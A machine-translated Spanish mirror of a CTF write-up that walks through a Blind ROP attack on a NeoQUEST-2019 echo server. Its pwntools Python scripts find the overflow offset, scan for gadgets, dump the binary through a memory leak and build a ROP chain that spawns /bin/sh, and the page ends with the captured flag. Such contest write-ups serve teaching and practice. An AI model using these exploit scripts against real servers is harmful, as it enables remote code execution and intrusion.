<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>😧 😟 🧔🏼 Servidor, ¿me oyes? Ataque BROP en el ejemplo de la tarea NeoQUEST-2019 ❤️ 🎰 🥚</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="¿Cómo encontrar una vulnerabilidad en un servidor sin información al respecto? ¿En qué se diferencia BROP de ROP? ¿Es posible descargar un archivo eje...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Servidor, ¿me oyes? Ataque BROP en el ejemplo de la tarea NeoQUEST-2019</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/neobit/blog/446942/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/d0/f6/ha/d0f6hadxvanaec185oy2mrhds9g.jpeg"></div><br><br>  ¿Cómo encontrar una vulnerabilidad en un servidor sin información al respecto?  ¿En qué se diferencia BROP de ROP?  ¿Es posible descargar un archivo ejecutable de un servidor a través de un desbordamiento de búfer?  ¡Bienvenido al gato, analizaremos las respuestas a estas preguntas en el ejemplo de pasar la tarea <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">NeoQUEST-2019</a> ! <br><a name="habracut"></a><br>  Se <b>dan la</b> dirección y el puerto del servidor: <b>213.170.100.211 10000</b> .  Intentemos conectarnos a él: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/kk/vk/hs/kkvkhs9yuyyv3v3wjniyeubciam.png"></div><br>  A primera vista, nada especial, un servidor de eco normal: devuelve lo mismo que nosotros mismos le enviamos. <br><br>  Después de jugar con el tamaño de los datos transmitidos, puede notar que con una longitud de línea suficientemente larga, el servidor no se pone de pie y termina la conexión: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/tb/w_/o3/tbw_o3nn4-fxbu4qt8tbc9xjgkc.png"></div><br>  Hmm, parece un desbordamiento. <br><br>  Encuentra la longitud del búfer.  Simplemente puede iterar sobre los valores, incrementándolos, hasta que obtengamos una salida no estándar del servidor.  Y puede mostrar un poco de ingenio y acelerar el proceso mediante la búsqueda binaria, comprobando si el servidor se bloqueó o no cayó después de la siguiente solicitud. <br><br><div class="spoiler">  <b class="spoiler_title">Determinar la longitud del búfer</b> <div class="spoiler_text"><pre><code class="java hljs">from pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> threading <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys ADDR = <span class="hljs-string"><span class="hljs-string">"213.170.100.211"</span></span> PORT = <span class="hljs-number"><span class="hljs-number">10000</span></span> <span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">find_offset</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">: start </span></span>= <span class="hljs-number"><span class="hljs-number">0</span></span> end = <span class="hljs-number"><span class="hljs-number">200</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> True: conn = remote(ADDR, PORT) curlen = (start + end) <span class="hljs-comment"><span class="hljs-comment">// 2 print("Testing {}".format(curlen)) payload = b'\xff' * curlen conn.send(payload) time.sleep(0.5) r = conn.recv() payload = b'\xff' * (curlen) conn.send(payload) try: r = conn.recv() start = curlen payload = b'\xff' * (curlen + 1) conn.send(payload) time.sleep(0.5) r = conn.recv() conn.send(payload) try: r = conn.recv() except EOFError: print("\nBuffer length is {}".format(curlen), flush=True) return curlen except EOFError: end = curlen return -1</span></span></code> </pre> <br></div></div><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/gn/me/c6/gnmec6g5vqg2eed5j7rysddlhz0.png"></div><br>  Entonces, la longitud del búfer es de 136. Si envía 136 bytes al servidor, borramos el byte nulo al final de nuestra línea en la pila y obtenemos los datos que lo siguen: el valor es 0x400155.  Y esta, aparentemente, es la dirección del remitente.  De esta manera, podemos controlar el flujo de ejecución.  Pero nosotros no tenemos el archivo ejecutable, y no sabemos dónde se pueden ubicar exactamente los dispositivos ROP que nos permitirían obtener el shell. <br><br>  ¿Qué se puede hacer al respecto? <br><br>  Existe una técnica especial que le permite resolver este tipo de problema sujeto al control de la dirección de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">retorno: Programación orientada al retorno a ciegas</a> .  En esencia, BROP es un escaneo ciego de un archivo ejecutable para dispositivos.  Reescribimos la dirección de retorno con alguna dirección del segmento de texto, establecemos los parámetros para el gadget deseado en la pila y analizamos el comportamiento del programa.  Basado en el análisis, nace una suposición ya sea que hayamos adivinado o no.  Los dispositivos auxiliares especiales desempeñan un papel importante: <b>detener</b> (su ejecución no conducirá a la finalización del programa) y <b>Trampa</b> (su ejecución hará que el programa finalice).  Por lo tanto, al principio se encuentran dispositivos auxiliares y, con su ayuda, ya se buscan los necesarios (por regla general, para llamar a <b>escribir</b> y obtener el archivo ejecutable). <br><br>  Por ejemplo, queremos encontrar un gadget que ponga un solo valor de la pila en un registro y <b>ret</b> .  Registraremos la dirección probada en lugar de la dirección de retorno para transferirle el control.  Después de eso, anotamos la dirección del gadget <b>Trap</b> que encontramos anteriormente, y detrás está la dirección del gadget <b>Stop</b> .  Lo que finalmente resulta: si el servidor se bloqueó ( <b>Trap</b> funcionó), entonces el gadget se encuentra en la dirección de prueba actual, que no coincide con la buscada: no elimina la dirección del gadget <b>Trap</b> de la pila.  Si <b>Stop</b> funcionó, entonces el gadget actual puede ser justo lo que estamos buscando: eliminó un valor de la pila.  Por lo tanto, puede buscar gadgets que coincidan con un comportamiento específico. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/wv/lg/n5/wvlgn5htlbmneqpwkwx3ukpnwfs.png"></div><br>  Pero en este caso, la búsqueda puede simplificarse.  Sabemos con certeza que el servidor nos está imprimiendo algún valor en respuesta.  Puede intentar escanear varias direcciones en el archivo ejecutable y ver si llegamos al código que muestra la línea nuevamente. <br><br><div class="spoiler">  <b class="spoiler_title">Descubrimiento de gadget</b> <div class="spoiler_text"><pre> <code class="java hljs">lock = threading.Lock() <span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">safe_get_next</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(gen)</span></span></span><span class="hljs-function">: with lock: return </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">next</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(gen)</span></span></span><span class="hljs-function"> def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">find_puts</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(offiter, buffsize, base=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400000</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: offset </span></span>= <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> True: conn = remote(ADDR, PORT) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: offset = safe_get_next(offiter) except StopIteration: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> payload = b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize payload += p64(base + offset) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> offset % <span class="hljs-number"><span class="hljs-number">0x10</span></span> == <span class="hljs-number"><span class="hljs-number">0</span></span>: print(<span class="hljs-string"><span class="hljs-string">"Checking address {:#x}"</span></span>.format(base + offset), flush=True) conn.send(payload) time.sleep(<span class="hljs-number"><span class="hljs-number">2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: r = conn.recv() r = r.strip(b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize)[<span class="hljs-number"><span class="hljs-number">3</span></span>:] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">if</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">len</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(r)</span></span></span><span class="hljs-function"> &gt; 0: </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">print</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-string"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"Memleak at {:#x}, {} bytes"</span></span></span></span><span class="hljs-function"><span class="hljs-params">.format(base + offset, len(r)</span></span></span><span class="hljs-function">), flush</span></span>=True) except: pass <span class="hljs-keyword"><span class="hljs-keyword">finally</span></span>: conn.close() offset_iter = iter(range(<span class="hljs-number"><span class="hljs-number">0x200</span></span>)) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">for</span></span></span><span class="hljs-function"> _ in </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">range</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">16</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: threading.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Thread</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(target=find_puts, args=(offset_iter, buffer_size, </span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400100</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">).</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">start</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> time.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sleep</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">1</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span></span></code> </pre> <br></div></div><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/v2/ec/pj/v2ecpjnrxpyfi0q8bmyxcjxuwj8.png"></div><br>  ¿Cómo podemos obtener el archivo ejecutable usando esta filtración? <br><br>  Sabemos que el servidor escribe una línea en respuesta.  Cuando vamos a la dirección <b>0x40016f, los</b> parámetros de la función de salida se llenan con algún tipo de basura.  Dado que, a juzgar por la dirección de retorno, estamos tratando con un archivo ejecutable de 64 bits, los parámetros de las funciones <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">se encuentran</a> en registros. <br><br>  Pero, ¿qué sucede si encontramos un dispositivo que nos permita controlar el contenido de los registros (ponerlos allí desde la pila)?  Tratemos de encontrarlo usando la misma técnica.  Podemos poner cualquier valor en la pila, ¿verdad?  Por lo tanto, necesitamos encontrar un gadget pop que ponga nuestro valor en el registro deseado antes de llamar a la función de salida.  Establezca la dirección del comienzo del archivo ELF ( <b>0x400000</b> ) como la dirección de la cadena.  Si encontramos el gadget correcto, entonces el servidor tendrá que imprimir la firma <b>7F 45 4C 46</b> en respuesta. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/vv/y-/po/vvy-podceguh1qf3k2ezoepoy0u.png"></div><br><div class="spoiler">  <b class="spoiler_title">La búsqueda de gadgets continúa</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">find_pop</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(offiter, buffsize, puts, base=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400000</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: offset </span></span>= <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> True: conn = remote(ADDR, PORT) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: offset = safe_get_next(offiter) except StopIteration: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> offset % <span class="hljs-number"><span class="hljs-number">0x10</span></span> == <span class="hljs-number"><span class="hljs-number">0</span></span>: print(<span class="hljs-string"><span class="hljs-string">"Checking address {:#x}"</span></span>.format(base + offset), flush=True) payload = b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize payload += p64(base + offset) payload += p64(<span class="hljs-number"><span class="hljs-number">0x400001</span></span>) payload += p64(puts) conn.send(payload) time.sleep(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: r = conn.recv() r = r.strip(b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize)[<span class="hljs-number"><span class="hljs-number">3</span></span>:] <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> b<span class="hljs-string"><span class="hljs-string">'ELF'</span></span> in r: print(<span class="hljs-string"><span class="hljs-string">"Binary leak at at {:#x}"</span></span>.format(base + offset), flush=True) except: pass <span class="hljs-keyword"><span class="hljs-keyword">finally</span></span>: conn.close() offset_iter = iter(range(<span class="hljs-number"><span class="hljs-number">0x200</span></span>)) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">for</span></span></span><span class="hljs-function"> _ in </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">range</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">16</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: threading.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Thread</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(target=find_pop, args=(offset_iter, buffer_size, </span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x40016f</span></span></span></span><span class="hljs-function"><span class="hljs-params">, </span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400100</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">).</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">start</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> time.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sleep</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">1</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span></span></code> </pre> <br></div></div><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/k8/po/ba/k8poba10qmh_-ssoas6vajqhfl0.png"></div><br>  Usando el conjunto resultante de direcciones, bombeamos el archivo ejecutable desde el servidor. <br><br><div class="spoiler">  <b class="spoiler_title">Extracción de archivos</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dump</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(buffsize, pop, puts, offset, base=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400000</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: conn </span></span>= remote(ADDR, PORT) payload = b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize payload += p64(pop) payload += p64(base + offset) # what to dump payload += p64(puts) conn.send(payload) time.sleep(<span class="hljs-number"><span class="hljs-number">0.5</span></span>) r = conn.recv() r = r.strip(b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize) conn.close() <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> r[<span class="hljs-number"><span class="hljs-number">3</span></span>:]: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> r[<span class="hljs-number"><span class="hljs-number">3</span></span>:] <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> None</code> </pre> <br></div></div><br>  Vamos a verlo en la IDA: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/dn/zf/pf/dnzfpf9byw59lzmq6uxutqfdfgg.png"></div><br>  La dirección <b>0x40016f</b> nos lleva a <b>syscall</b> , y <b>0x40017f nos lleva</b> a <b>pop rsi</b> ;  <b>ret</b> . <br><br>  Ahora que tiene un archivo ejecutable a mano, puede construir una cadena ROP.  ¡Además, la línea <b>/ bin / sh también estaba en ella</b> ! <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/mp/--/ui/mp--uihjhux5_-xbm9aqcfbclpi.png"></div><br>  Formamos una cadena que llama al <b>sistema</b> con el argumento <b>/ bin / sh</b> .  Puede encontrar información sobre las llamadas al sistema en Linux de 64 bits, por ejemplo, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aquí</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Último pequeño paso</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">get_shell</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(buffsize, base=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400000</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: conn </span></span>= remote(ADDR, PORT) payload = b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize payload += p64(base + <span class="hljs-number"><span class="hljs-number">0x17d</span></span>) payload += p64(<span class="hljs-number"><span class="hljs-number">59</span></span>) payload += p64(<span class="hljs-number"><span class="hljs-number">0</span></span>) payload += p64(<span class="hljs-number"><span class="hljs-number">0</span></span>) payload += p64(base + <span class="hljs-number"><span class="hljs-number">0x1ce</span></span>) payload += p64(base + <span class="hljs-number"><span class="hljs-number">0x1d0</span></span>) payload += p64(base + <span class="hljs-number"><span class="hljs-number">0x17b</span></span>) conn.send(payload) conn.interactive()</code> </pre> <br></div></div><br>  Ejecute el exploit y obtenga el shell: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/vk/bv/vi/vkbvviq-wsbdkmie1iksoiwckim.png"></div><br>  Victoria! <br><br>  <b>NQ201934D811DCBD6AA2926218976CB3340DE95902DD0F33E60E4FF32BAD209BBA4433</b> <br><br>  Muy pronto, aparecerán vraytaps para las otras tareas de la etapa en línea de NeoQUEST-2019.  ¡Y la "confrontación" tendrá lugar el 26 de junio!  Las noticias aparecerán en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">el sitio web del</a> evento, ¡no te lo pierdas! </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/446942/">https://habr.com/ru/post/446942/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../446924/index.html">Representación de polinomios arbitrarios en forma de diferencias finitas con un paso arbitrario.</a></li>
<li><a href="../446926/index.html">"Entonces me di cuenta de que ahora soy un ingeniero de citas, y de otra manera puedes posicionarse en el mercado"</a></li>
<li><a href="../446932/index.html">TDMS Fairway y BIM</a></li>
<li><a href="../446938/index.html">Sistema de partículas en Core Animation. Cuento de navidad</a></li>
<li><a href="../446940/index.html">QA en prod. Porque es genial</a></li>
<li><a href="../446944/index.html">¿Por qué invertir en empresas no rentables?</a></li>
<li><a href="../446948/index.html">Cómo el troyano Gustuff de Android elimina la crema (fiat y cripto) de sus cuentas</a></li>
<li><a href="../446950/index.html">El 76% de los fabricantes no tienen experiencia en la implementación de aditivos. ¿Por qué es bueno?</a></li>
<li><a href="../446952/index.html">Crea histogramas animados usando R</a></li>
<li><a href="../446956/index.html">Es dañino para la luz o para mantener la carga de la batería de un automóvil.</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>